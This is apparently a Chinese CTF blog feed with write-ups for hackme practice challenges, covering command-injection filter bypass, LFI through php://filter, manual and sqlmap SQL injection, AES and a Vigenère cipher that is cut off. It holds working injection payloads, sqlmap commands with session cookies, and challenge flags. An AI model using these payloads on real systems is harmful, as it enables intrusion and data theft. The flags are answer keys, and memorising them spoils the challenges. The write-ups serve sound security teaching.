class="line">print(flag)</span><br></pre></td></tr></table></figure><p>注意：<br>本例为python3程序，如果使用python2，decode(‘ISO-8859-1’)就不需要。关于pyhton2与python3的bytes和str的转换可以查阅相关资料，另外各种基本的的编码也应该熟悉，比如ASCII，GB2312，Unicode，UTF-8，ISO-8859-1等。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考察基本的逆向工程理解代码的能力，所以直接使用IDA既可以看到反编译的源码（F5），不过对于初学者还是建议分析一下具体的汇编代码，有助于理解汇编语言。</p><p>python写脚本的能力也是非常重要的！</p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> IDA </tag>
            
            <tag> Binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ping</title>
      <link href="/2019/10/09/ping/"/>
      <url>/2019/10/09/ping/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-ping"><a href="#src-hackme-ping" class="headerlink" title="[src = hackme] ping"></a>[src = hackme] ping</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you ping 127.0.0.1?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页如下：</p><p><img src="./ping.PNG" alt="ping"></p><p>可以看到页面进行了黑名单过滤，常用的|管道符，cat，cp等命令都被过滤掉了，所以无法进行简单的命令执行，如输入“|ls”会显示：“| not allowed”；哪如何绕过黑名单哪？我们解释一下exec函数：</p><p>exec()  —执行外部程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string <span class="built_in">exec</span> ( string <span class="variable">$command</span> [, array &amp;<span class="variable">$output</span> [, int &amp;<span class="variable">$return_var</span> ]] )</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>   要执行的shell 命令</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span>    shell命令的输出填充此数组,每行输出填充数组中的一个元素。</span><br><span class="line"></span><br><span class="line"><span class="variable">$return_var</span>  命令执行后的返回状态，命令执行成功值是0</span><br><span class="line"></span><br><span class="line">2&gt;&amp;1      <span class="built_in">exec</span>不成功，调试方案一个技巧就是使用管道命令, 使用 2&gt;&amp;1, 命令就会输出shell执行时的错误到<span class="variable">$output</span>变量, 输出该变量即可分析。</span><br></pre></td></tr></table></figure><p>这时如果对Linux基本命令熟悉的话会想到反引号“`”，bash命令中的双引号(“)，单引号(‘)，反引号(`)区别:</p><p>反引号(``):  反引号作用相当于命令替换，Bash处理时引用的部分会被优先执行，执行结果被替换到外层的命令行文本中；反引号可以嵌套使用，但是嵌套时内部的反引号必须进行转义处理。</p><p>单引号(‘’):    在命令行中，单引号引用的部分的所有特殊字符均按照普通字符解释</p><p>双引号(“”):  双引号引用的部分，仅解释美元符号$、转义符\ 和反引号`，解释后的文本仅按照普通文字处理，即同单引号的处理。</p><p>要想得到flag，我们需要先看一下当前目录下有没有flag相关文件，可以用ls命令（本题并没有过滤ls），所以输入`ls`，页面输出：<br><img src="./ping1.PNG" alt="ping1"></p><p>可以看到目录下有flag.php，index.php两个文件，flag.php里面应该包含了flag。常见的思路是使用cat命令查看该文件的内容，但是黑名单过滤了cat命令。那就需要考虑linux系统还有哪些可以查看文件内容，但又没有在黑名单的命令可用。其中sort就是其中一个。sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。其他可以用来显示文件内容对命令包括：</p><pre><code>tac命令 : 反序输出文件的内容，文件的最后一行显示在第一行head命令:   用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。tail命令:  用于显示文件的结尾的内容。在默认情况下，taild命令显示文件的后10行内容。more命令： 按页来查看文件的内容。</code></pre><p>但是sort命令后面需要跟文件名，但flag被过滤，所以`sort flag.php`行不通。</p><p>哪这么办哪？可以想到Linux系统的通配符。输入`sort ????????`，可以得到flag。<br><img src="./ping2.PNG" alt="ping2"></p><p>或者`tail f*`也可以得到flag。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考察了命令执行（Commnd Execution）漏洞的利用，主要考察了命令执行的基本原理，如何绕过过滤。其中一些常用的Linux系统命令的使用要熟悉，比如ls，cat，sort等。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commnd Execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LFI</title>
      <link href="/2019/09/30/LFI/"/>
      <url>/2019/09/30/LFI/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含,题目对提示也是本地文件包含（LFI，Local file inclusion），还有一种是远程文件包含（RFI、Remote file inclusion）。php中常见的文件包含函数有以下四种：<br>include()<br>require()<br>include_once()<br>require()_once()</p><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。<br>示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>或者通过后天添加后缀对方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>].<span class="string">"php"</span>;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。</p><p>再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php伪协议php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><p>补充：php其他对伪协议<br>php://input:可以读取没有处理过的POST数据,不依赖于特定的php.ini指令。当enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> 本地文件包含 </tag>
            
            <tag> php://filter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>homepage</title>
      <link href="/2019/09/30/homepage/"/>
      <url>/2019/09/30/homepage/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-homepage"><a href="#src-hackme-homepage" class="headerlink" title="[src = hackme] homepage"></a>[src = hackme] homepage</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Where is the flag? Did you check the code?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。题目提示要检查主页的代码，按照惯例，查看主页源代码，在最后发现cute.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"cute.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>打开，发现下面的内容：</p><p><img src="./cute.PNG" alt="cute"></p><p>将这段代码放到火狐浏览器的控制台（F12），执行得到一个二维码，扫码得到flag：</p><p><img src="./cute1.PNG" alt="cute"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>JavaScript是前端脚本语言，比如XSS等漏洞就出现在其中，浏览器的F12功能在调试浏览器代码过程中也非常有用！</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guestbook</title>
      <link href="/2019/09/30/guestbook/"/>
      <url>/2019/09/30/guestbook/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-guestbook"><a href="#src-hackme-guestbook" class="headerlink" title="[src = hackme] guestbook"></a>[src = hackme] guestbook</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>This guestbook sucks. sqlmap is your friend.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击Message List，发现没有消息，通过New Post添加一条，然后再查看可以看到POST的消息，这是一个留言板，添加消息后结果如图：</p><p><img src="./guestbook.PNG" alt="guest"></p><p>题目的提示已经说明这是一个SQL注入题目，现在查看注入点，点击添加的消息，发现URL为：<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=13362" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=13362</a>。<br>测试后面的id字段：添加’，输出Sorry, no data for this。说明存在注入。</p><p>按照注入的基本步骤，首先数据库名，表名，字段然后数据的次序进行。<br>使用union注入，需要测试后面的列数，测试到4时（?mod=read&amp;id=-1 union select 1,2,3,4 #），输出结果如下：<br>（id=-1是使得前面的字句没有返回，这样页面就可以显示union后面字句查询的内容）<br><img src="./sql1.PNG" alt="guest1"><br>其中显示2,3,4的位置都是有输出的位置，可以用来显示注入得到的数据。</p><p>注入数据库名字，在第3列显示：<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#&gt;<br>得到数据库名字为g8.</p><p>执行<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#&gt;<br>得到表名为flag的表。</p><p>测试flag表的字段，输入如下的注入语句时得到flag字段。<br>?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=’flag’ limit 1,1),4#</p><p>最后一步获取字段的值：<br>?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4#</p><p>得到如下输出，即为flag：<br><img src="./sql2.PNG" alt="guest1"></p><p>本题已经提示了可以使用sqlmap，所以本题的第二种解法就是使用sqlmap，sqlmap是进行SQL注入的神器，KALI系统已经集成，所以直接上KALI。<br>首先测试注入点（-u 参数为测试注入的URL，–cookie 参数为注入会话的cookie）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"</span></span><br></pre></td></tr></table></figure><p>输出显示id字段是可注入的（GET parameter ‘id’ is vulnerable.）。<br>注入数据库名字（–dbs参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  --dbs</span></span><br></pre></td></tr></table></figure><p>得到三个数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases [3]:</span><br><span class="line">[*] g8</span><br><span class="line">[*] guestbook</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><p>information_schema是MySQL自带的管理数据库的数据库，我们先测试g8，看g8中存在那些表。-D参数指定要测试的数据库为g8，–tables参数说明要查看所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 --tables</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| posts |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p>发现flag表，flag很可能就在这个表中，所以我们直接对该表进行字段猜测,-T 参数指定表名，–columns 说明要查询所有字段名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| flag     | varchar(255) |</span><br><span class="line">| id       | int(11)      |</span><br><span class="line">| padding0 | int(11)      |</span><br><span class="line">| padding1 | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>有flag字段，最后dump该表的内容即可！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns --dump</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[3 entries]</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| id | flag                                               | padding1 | padding0 |</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| 1  | http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif          | 31415926 | 1337     |</span><br><span class="line">| 2  | FLAG&#123;Y0U_KN0W_SQL_1NJECT10N!!!<span class="string">' or 595342&gt;123123#&#125; | 88       | 77       |</span></span><br><span class="line"><span class="string">| 3  | http://i.giphy.com/m7BTtLWhjkEJa.gif               | 9999     | 6666     |</span></span><br><span class="line"><span class="string">+----+----------------------------------------------------+----------+----------+</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>sql注入是最为危险的web安全问题之一，通过该例子可以很好的练习手动注入的过程，建议通过手动注入的方式进行。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hide and seek</title>
      <link href="/2019/09/30/hide-and-seek/"/>
      <url>/2019/09/30/hide-and-seek/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-hide-and-seek"><a href="#src-hackme-hide-and-seek" class="headerlink" title="[src = hackme] hide and seek"></a>[src = hackme] hide and seek</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you see me? I’m so close to you but you can’t see me.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。对于Web类型的题目，开始的时候查看一下网页源代码是很有必要的。右键–&gt;查看网页源代码。然后搜索FLAG，在页面最后找到flag：<br><img src="./seek.PNG" alt="seek"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>查看网页源代码是一个好习惯！！</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>easy AES</title>
      <link href="/2019/09/30/easy-AES/"/>
      <url>/2019/09/30/easy-AES/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-easy-AES"><a href="#src-hackme-easy-AES" class="headerlink" title="[src = hackme] easy AES"></a>[src = hackme] easy AES</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you encrypt things with AES?<br>Tips: What is symmetric cipher?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出一个压缩包，解压后是一段py代码。我们在代码行增加注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  <span class="comment"># pip3 install pycrypto</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(data)</span>:</span></span><br><span class="line">    c = AES.new(<span class="string">b'Hello, World...!'</span>)  <span class="comment">#AES.new用第一个参数作为秘钥生产AES对象</span></span><br><span class="line">    plain_text = bytes.fromhex(input(<span class="string">'What is your plain text? '</span>))   <span class="comment">#输入明文</span></span><br><span class="line">    <span class="keyword">if</span> c.encrypt(plain_text) != <span class="string">b'Good Plain Text!'</span>:  <span class="comment">#基于上面的AES加密对象加密输入的明文，判断得到的米文娜是否为b'Good Plain Text!'</span></span><br><span class="line">        print(<span class="string">'Bad plain text'</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)  <span class="comment">#用输入的plain text作为秘钥生产AES对象</span></span><br><span class="line"></span><br><span class="line">    decrypted = c2.decrypt(data)  <span class="comment">#用生产的AES对象解密data</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> fout:   <span class="comment">#解密得到的数据写入文件output.jpg</span></span><br><span class="line">        fout.write(decrypted)</span><br><span class="line"></span><br><span class="line">main(base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br></pre></td></tr></table></figure><p>整个过程就清晰了，分两个阶段：<br>首先输入一段明文，使用生产的c这个AES对象加密，要求加密结果为b’Good Plain Text!’，因此可反向思维，明文就是b’Good Plain Text!’基于加密对象c的解密结果。<br>第二个阶段使用第一个阶段的plain text作为密钥解密data，并写入到output.jpg文件中。</p><p>因此可以使用下面的结题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = AES.new(<span class="string">b'Hello, World...!'</span>)</span><br><span class="line">plain_text = c.decrypt(<span class="string">b'Good Plain Text!'</span>)</span><br><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br><span class="line">data = base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypted = c2.decrypt(data)</span></span><br><span class="line"><span class="string">with open('</span>output.jpg<span class="string">', '</span>w<span class="string">b') as fout:</span></span><br><span class="line"><span class="string">    fout.write(decrypted)</span></span><br></pre></td></tr></table></figure><p>程序输出为图片,里面包含flag：<br><img src="./output.jpg" alt="aes"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对对称加密算法AES的理解以及python中密码学API的使用，遇到没有使用过的API查阅文档也是一个好习惯！<br>建议：本题其实不需要深入理解AES算法，但是AES算法是一个非常重要的对称加密算法，建议查阅密码学书籍进行深入理解，其实下面的API调用的参数就需要理解AES的工作模式（CBC），分组密码共有5种工作模式，这是其中一种，后面的IV的作用是什么？读者查阅资料来理解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>classic cipher 2</title>
      <link href="/2019/09/30/classic-cipher-2/"/>
      <url>/2019/09/30/classic-cipher-2/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-2"><a href="#src-hackme-classic-cipher-2" class="headerlink" title="[src = hackme] classic cipher 2"></a>[src = hackme] classic cipher 2</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve this vigenere cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段密文，且提示是维吉尼亚（vigenere）密码算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V KGIFEI WCTPK MJ C SNMEF FF TYQDJLJ CIJNYPG YNQ CCMMBGNL WRGCNMJ AVXY TCZBLWRP CUFIUV LGWSQ KSNTI EFMIG MIY ERE OWJCXLTGBNPOVR WRYEM VHVCKC NOH DCAEU THQNJI MJ CW GTYDVTTMFIDLR IRGZVZKH GESPGAXKI YKSGPVA KHG CEOBBX TVUUXVQL IF GPLWZSLER AVDMQHYGIU XQ ZTZXRWRNUIWI CCOWDS AFIHYHM NP GTNLTYF QEMBZRCXO ENS BTVVCBTK VVUTNVVCETU SR PFVNTS QHH GJC UAIECV ALAMXS EKMLORV ARW NQKPRX KN FBR FZEIY FXU FJ NEI UPFQ UOEKTLY QF TBCUCXV ENIEI YI CDDPHVF TUF VGJTTSGWJMSJ SV JVBJGBVTTMF PAS WTUIROMX VBWR VGKDBRKGD GIEV YET PEWICW ZRLYRGGB TUE OGKP OHXG A HYPZZL BJ AYNG GBWY FECMIVVD VRI NJRHYIDM WHRNLVED ASZVIGB MCNZ LU AVXY AJII OI YCD NEHKEG VRI GSYRRXYW JYCGR BF EFW BSBEXSKNZ BUWFMEK DG IOI TJES B RWDBGB SI DYWUMDCW FVYFS HLTW ASIW MHCD OPKC VRMIPBTK XYG DVTL LLLKK GKJJI JEYX XUCR SUE SYV MSTXG A EKZAGV FECEF II JEIFIAJW TVSVKYUBLY NLUH WUG UAF A NFATV IG MHG C DV TIJWGERMG JSCWMAJWV UOTYXKZ INCKQFPRP URBTP MX I UAXLAT MJVZEVRZRI ICJLFXIRT HKWFGBMQH DWFQ SUVQKLIF VPPKQGN MAE HVVO NEF RZRG EDYHJ CNQ ZSW EEGN XR BBI TYHFCOTYCRS EM XTSG TGD HVVO NEF WGEEMH HRU CLY JR WGPGBGDTC YYI RCK SQMD EARC AV ZOEEYYYJLZLR GRIUIG ZECCDJJPN SE KXXUPBZTIT NS AGU YBRVCJA TY ZBLOYMMY WGIRO JWJZI ZVS NO MPKRKMEWF ATEGEWXVQL TUAE RSSWS TZEU DJ XXICEII 